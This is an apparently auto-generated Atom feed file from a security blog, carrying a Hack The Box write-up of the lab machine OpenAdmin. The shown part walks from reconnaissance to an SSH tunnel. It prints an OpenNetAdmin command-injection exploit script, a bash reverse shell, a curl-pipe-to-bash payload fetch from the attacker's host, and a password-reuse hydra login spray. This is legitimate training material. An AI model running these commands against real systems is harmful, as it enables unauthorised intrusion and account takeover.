@@ -1,0 +1,357 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-02T17:20:32+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Chr0x6eOs - Blog</title><subtitle>Blog for HTB writeups and other security related stuff</subtitle><entry xml:lang="en"><title type="html">Hack The Box - OpenAdmin Writeup</title><link href="http://localhost:4000/2020/04/02/htb-OpenAdmin.html" rel="alternate" type="text/html" title="Hack The Box - OpenAdmin Writeup" /><published>2020-04-02T00:00:00+02:00</published><updated>2020-04-02T00:00:00+02:00</updated><id>http://localhost:4000/2020/04/02/htb-OpenAdmin</id><content type="html" xml:base="http://localhost:4000/2020/04/02/htb-OpenAdmin.html">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/htb/OpenAdmin/openadmin.png&quot; alt=&quot;OpenAdmin Image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/222&quot;&gt;OpenAdmin&lt;/a&gt; is an easy linux box by &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/82600&quot;&gt;dmw0ng&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The box starts with web-enumeration, which reveals an old version of the software OpenNetAdmin. This version is vulnerable to a remote-code-execution exploit. This gives us code-execution in the context of the user www-data. After finding a clear-text password in the config file OpenNetAdmin, we can login via ssh. Checking the listening ports, an internal website is revealed. The website is protected with a login, however the password is hardcoded. Logging in to the website reveals a password-protected SSH-key. After cracking the passphrase for the ssh-key we can login and read user.txt.
+In order to get root we have to abuse sudo privileges for the nano binary.&lt;/p&gt;
+
+&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.171
+&lt;span class=&quot;go&quot;&gt;Nmap scan report for 10.10.10.171
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT   STATE    SERVICE VERSION
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;| ssh-hostkey:
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp filtered http
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;The only two open ports shown are &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt;. SSH usually is not that interesting, so let’s begin with http.&lt;/p&gt;
+
+&lt;h2 id=&quot;http---port-80&quot;&gt;HTTP - Port 80&lt;/h2&gt;
+&lt;p&gt;Going to https://10.10.10.171 we the default apache2 page is shown. To further enumerate the website, we’ll start a gobuster.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.171 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;go&quot;&gt;===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.171
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/05/02 14:01:26 Starting gobuster
+===============================================================
+/music (Status: 301)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Immediately after starting the gobuster we get a result returned.
+Going to /music this webpage is shown:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/OpenAdmin/webpage-music.png&quot; alt=&quot;/music webpage&quot; /&gt;
+Checking out the links, Login directs to http://10.10.10.171/ona:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/OpenAdmin/webpage-ona.png&quot; alt=&quot;OpenAdmin webpage&quot; /&gt;
+The website title suggests, that this website is running a software called “OpenNetAdmin”. Furthermore, there is an alert, telling us, that the current version of this website (v18.1.1) is out of date.&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-shell---exploiting-opennetadmin&quot;&gt;Initial Shell - Exploiting OpenNetAdmin&lt;/h1&gt;
+&lt;h2 id=&quot;finding-rce-exploit&quot;&gt;Finding RCE exploit&lt;/h2&gt;
+&lt;p&gt;Running searchsploit a RCE (remote code execution) vulnerability is revealed:&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;searchsploit &lt;span class=&quot;s2&quot;&gt;&quot;OpenNetAdmin&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;----------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                               |  Path
+                                                                             | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                                | exploits/php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                 | exploits/php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                                  | exploits/php/webapps/47691.sh
+----------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The last exploit seems to match the version of the current deployed OpenNetAdmin, so we’ll check this one out first.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;rce.sh
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
+&lt;span class=&quot;go&quot;&gt;
+URL=&quot;http://10.10.10.171/ona/&quot;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;while true;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;do
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;         echo -n &quot;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;; read cmd
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;         curl --silent -d &quot;xajax=window_submit&amp;amp;xajaxr=1574117726710&amp;amp;xajaxargs[]=tooltips&amp;amp;xajaxargs[]=ip%3D%3E;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;         echo \&quot;BEGIN\&quot;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;END&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;xajaxargs[]=ping&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; |
+&lt;span class=&quot;go&quot;&gt;         sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seems like there is a command injection in one of the post parameters.&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-a-shell-as-www-data&quot;&gt;Getting a shell as www-data&lt;/h2&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;./rse.sh
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;www-data
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Running the exploit we can verify code-execution by issuing a simple “whoami”. Seems like we have code-execution in the context of the user “www-data”. Let’s get a shell next!&lt;/p&gt;
+
+&lt;p&gt;In order to evade bad characters and other issues, I am going to host the reverse shell with a python webserver and use the RCE to access and execute my payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;s.sh
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
+&lt;span class=&quot;gp&quot;&gt;bash -c 'bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.7/443 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;'
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This simple bash reverse-shell should do the trick.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;span class=&quot;go&quot;&gt;Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With the webserver up and running we now just need to access and execute the reverse-shell using the exploit.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;./rce.sh
+&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;which curl
+&lt;span class=&quot;go&quot;&gt;/usr/bin/curl
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl 10.10.14.7/s.sh | bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With curl being installed, we can simply access the shell and directly pipe it into bash to execute the reverse-shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.171 - - [02/May/2020 14:36:59] &quot;GET /s.sh HTTP/1.1&quot; 200 -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The reverse-shell is being accessed from the python webserver.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 443
+&lt;span class=&quot;go&quot;&gt;Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.171.
+Ncat: Connection from 10.10.10.171:39448.
+bash: cannot set terminal process group (1049): Inappropriate ioctl for device
+bash: no job control in this shell
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;www-data@openadmin:/opt/ona/www$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We got the shell returned! Next up let’s enumerate the system.&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+&lt;h2 id=&quot;enumeration-as-www-data&quot;&gt;Enumeration as www-data&lt;/h2&gt;
+&lt;p&gt;After a bit of searching around, an interesting config file can be found at /opt/ona/www/local/config/database_settings.inc.php :&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ona_contexts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s1&quot;&gt;'DEFAULT'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'databases'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'db_type'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysqli'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'db_host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'db_login'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ona_sys'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'db_passwd'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'n1nj4W4rri0R!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'db_database'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ona_default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'db_debug'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'description'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Default data context'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'context_color'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#D3DBFF'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now having found a password, we need a user to login with.&lt;/p&gt;
+
+&lt;p&gt;Checking out /etc/passwd for possible users to log in to:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;www-data@openadmin:/opt/ona/www/local/config$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;root:x:0:0:root:/root:/bin/bash
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seems like we have 3 possible users (actually 2, because root is rather unlikely) we can try to authenticate with the found password.&lt;/p&gt;
+
+&lt;h2 id=&quot;privesc-to-jimmy&quot;&gt;Privesc to jimmy&lt;/h2&gt;
+&lt;p&gt;Of course we could try to su with our current reverse-shell, however Port 22 is open, so let’s try SSH first. If this succeeds we get a much stabler shell and have some additional features like portforwarding or copying via scp.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;users.txt
+&lt;span class=&quot;go&quot;&gt;root
+jimmy
+joanna
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'n1nj4W4rri0R!'&lt;/span&gt; ssh://10.10.10.171
+&lt;span class=&quot;go&quot;&gt;[DATA] attacking ssh://10.10.10.171:22/
+[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
+1 of 1 target successfully completed, 1 valid password found
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Using hydra we can quickly evaluate if any of the users on the system are allowed to login with the found password. Jimmy seems to be allowed to login via ssh with the password ‘n1nj4W4rri0R!’.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;ssh jimmy@10.10.10.171
+The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
+ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
+jimmy@10.10.10.171's password: n1nj4W4rri0R!
+
+Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-joanna&quot;&gt;Privesc to joanna&lt;/h2&gt;
+&lt;p&gt;As there was no user.txt found in the home directory of jimmy, the next step is to escalate privileges to joanna.&lt;/p&gt;
+&lt;h3 id=&quot;enumerating-ports&quot;&gt;Enumerating ports&lt;/h3&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-alnp&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;LISTEN &quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Checking out all the ports listening on localhost only, the port &lt;strong&gt;52846&lt;/strong&gt; stands out in particular.&lt;/p&gt;
+
+&lt;p&gt;We can simply verify what’s listening on the port, by connecting to it via nc and sending some junk data:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc 127.0.0.1 52846
+&lt;span class=&quot;go&quot;&gt;Test
+HTTP/1.1 400 Bad Request
+Date: Sat, 02 May 2020 13:06:30 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 314
+Connection: close
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Content-Type: text/html;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;400 Bad Request&amp;lt;/title&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&amp;lt;body&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Bad Request&amp;lt;/h1&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Your browser sent a request that this server could not understand.&amp;lt;br /&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;address&amp;gt;&lt;/span&gt;Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Server at internal.openadmin.htb Port 80&amp;lt;/address&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This response is really valuable, as it gives us a lot of information. We now know that on 52846 an Apache webserver is running and the hostname is &lt;em&gt;internal.openadmin.htb&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;As we have the possibility to login via SSH, we can portforward the http-traffic through the SSH-tunnel to the port and browse the page normally.&lt;/p&gt;
+
+&lt;h3 id=&quot;portforwaring-via-ssh&quot;&gt;Portforwaring via SSH&lt;/h3&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;ssh jimmy@10.10.10.171 -L 80:127.0.0.1:52846
+jimmy@10.10.10.171's password: n1nj4W4rri0R!
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can verify the tunnel by checking our listening ports:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;netstat -alnp | grep &quot;LISTEN &quot;
+tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      23457/ssh
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seems like the tunnel is working! Let’s browse the website.&lt;/p&gt;
+
